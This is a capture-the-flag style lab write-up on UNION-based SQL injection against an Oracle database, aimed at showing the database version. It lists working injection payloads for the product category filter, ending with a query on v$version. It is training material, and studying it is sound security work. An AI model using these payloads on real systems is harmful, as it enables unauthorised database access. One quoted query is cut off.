# 🧠 Lab Title: SQL injection attack, querying the database type and version on Oracle

## 🔍 Category
SQLI

## 🎯 Objective
> Display the database version string.

## 🧰 Tools Used
- Notepad

## 🚀 Exploitation Steps
#### Observe the description
> Before diving into the lab, we’re told it's using an Oracle database, which has a special dummy table called `dual`. so the statment looks like this 
```sql 
UNION SELECT 'abc' FROM dual
``` 
and the vulnerability is in the product category filter, we should do UNION based attack.

#### Access the lab
> Click on `ACCESS THE LAB`

#### START HACKING!!!
1) Imagine the query  
```sql
SELECT * FROM products WHERE category = '';
```
2) Enter '
3) We get a 500 error – this is a good sign, as it suggests our input broke the query, indicating SQL injection 
4) from [portswigger's cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) we know that to retrive the database version we do 
```sql
SELECT banner FROM 
```
but first we need to define the numbers of coulmns of the database so we do
```sql
' UNION SELECT NULL FROM dual -- 
```
we still get 500 , which means our statment is wrong , so we will put another NULL 

```sql
' UNION SELECT NULL ,NULL FROM dual -- 
```
we got a 200 (HTTP STATUS CODE)!!!

so now lets build our payload

```sql
' UNION SELECT BANNER , NULL FROM v$version --
```
### 4. Proof of Success
- We can see the database version
## 🧵 Reflection
> What is the table that Oracle has as a dummy? \
> How to retrieve the version of the Oracle database?
